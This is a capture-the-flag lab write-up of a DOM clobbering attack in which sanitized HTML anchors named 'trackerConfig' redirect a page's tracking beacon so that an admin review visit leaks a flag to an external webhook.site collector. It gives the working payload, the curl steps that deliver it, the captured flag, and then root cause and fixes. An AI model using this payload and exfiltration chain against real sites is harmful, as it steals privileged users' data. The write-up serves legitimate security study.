# Doppelganger Pwnbox Lab - trackerConfig DOM Clobbering

Date: 2026-07-09
Target type: CTF/lab
Bug class: HTML injection, DOM clobbering, post-sanitize global gadget abuse, admin-context disclosure

## Observation

Target: `https://a238f35722c0.pwnbox-lab.com/`

Initial facts:

- Login via `POST /api/login` with `demo / demo123`.
- Dashboard creates widgets via `POST /api/widgets` with `title` and `body` (HTML).
- Widget page at `/widget/<id>` renders body with DOMPurify then runs a built-in tracker.
- `POST /api/report` with `{ "id": "<widgetId>" }` sends widget to admin for review.

Widget page sink:

```javascript
document.getElementById('widget-body').innerHTML = DOMPurify.sanitize(RAW)

const tracker = window.trackerConfig || { endpoint: '/api/ping' }
new Image().src = String(tracker.endpoint) + '?d=' + encodeURIComponent(JSON.stringify(window.__ctx || {}))
```

## Hypothesis

DOMPurify may block script execution in the snippet, but allowed `<a id="...">` markup can still clobber `window.trackerConfig` after insertion. If `tracker.endpoint` stringifies to attacker `href`, the page will beacon `window.__ctx` to an external collector. Admin review may populate `__ctx` with the flag.

## Evidence

Local browser tests with DOMPurify 3 confirmed:

```html
<a id="trackerConfig"></a>
<a id="trackerConfig" name="endpoint" href="https://example.com/x"></a>
```

- `window.trackerConfig` → `HTMLCollection`
- `tracker.endpoint` → second anchor
- `String(tracker.endpoint)` → `https://example.com/x`

Failed clobber shapes:

- `<form id="trackerConfig"><input name="endpoint" value="...">` → `String(endpoint)` is `[object HTMLInputElement]`
- single `<a id="trackerConfig">` without named `endpoint` → `undefined`

## Test

Minimal payload:

```html
<a id="trackerConfig"></a><a id="trackerConfig" name="endpoint" href="https://webhook.site/[uuid]"></a>
```

Flow:

```bash
curl -sS -X POST "https://a238f35722c0.pwnbox-lab.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"demo","password":"demo123"}'

curl -sS -X POST "https://a238f35722c0.pwnbox-lab.com/api/widgets" \
  -H "Content-Type: application/json" \
  -d '{"title":"exfil","body":"<a id=\"trackerConfig\"></a><a id=\"trackerConfig\" name=\"endpoint\" href=\"https://webhook.site/[uuid]\"></a>"}'

curl -sS -X POST "https://a238f35722c0.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"id":"<widgetId>"}'
```

## Failed Assumptions

1. **Classic XSS in snippet required** — DOMPurify stripped `onerror`/`onload`; no script execution needed.
2. **`form` + `input name="endpoint"` sufficient** — endpoint did not stringify to collector URL.
3. **User visit alone would leak flag** — privileged `__ctx` appeared on admin review visit.
4. **Cookie theft via `document.cookie`** — flag was in `window.__ctx`, not readable cookies.

## Result

Confirmed chain:

```text
User HTML uploaded
-> DOMPurify sanitizes and mounts <a id="trackerConfig"> clobber
-> page reads window.trackerConfig
-> String(tracker.endpoint) becomes attacker href
-> Image beacon sends JSON.stringify(window.__ctx)
-> admin review visit includes flag in __ctx
-> collector receives ?d={"flag":"..."}
```

Webhook evidence (admin visit):

```text
d={"flag":"pwnbox{6e958fb35af1995336d35acca008ee5e}"}
```

Flag:

```text
pwnbox{6e958fb35af1995336d35acca008ee5e}
```

## Why Failed Payloads Failed

| Attempt | Why it failed |
|---|---|
| `<img onerror=...>` | Stripped by DOMPurify |
| `<form><input name="endpoint" value=...>` | `String(tracker.endpoint)` not a URL |
| Clobber without admin report | No privileged `__ctx` in beacon |

## Why Working Test Worked

Sanitization only covered the HTML fragment. The page's trusted post-render script treated `window.trackerConfig` as safe. Dual-`id` anchor clobbering survived DOMPurify and redirected the built-in image beacon. Admin context supplied the flag in `__ctx`.

## Root Cause

1. User HTML mounted before trusted script runs.
2. Configuration read from clobberable `window.trackerConfig`.
3. Privileged review data exposed in `window.__ctx` on admin view.
4. Automatic beacon serialized and sent client-controlled context off-origin.

## Impact

- Admin-only secret disclosure without XSS.
- Misrouting of analytics/beacon traffic.
- False sense of safety from DOMPurify alone.

## Fix

- Use non-global immutable config for tracker endpoints.
- Never serialize `window.__ctx` to outbound URLs on user-content pages.
- Render user HTML in isolated iframe without access to review globals.
- Audit all post-sanitize `window.*` reads.

## Regression Test

- Dual-`id` `trackerConfig` clobber must not change beacon destination.
- Admin flag must not appear in any client-side global on user-rendered widget pages.

## Conclusion

Confirmed HTML injection via DOM clobbering of a post-sanitize global gadget. Impact is data exfiltration from privileged page views, not script execution in the snippet.

## Next Step

Extract reusable KB: note, payload pattern, checklist.
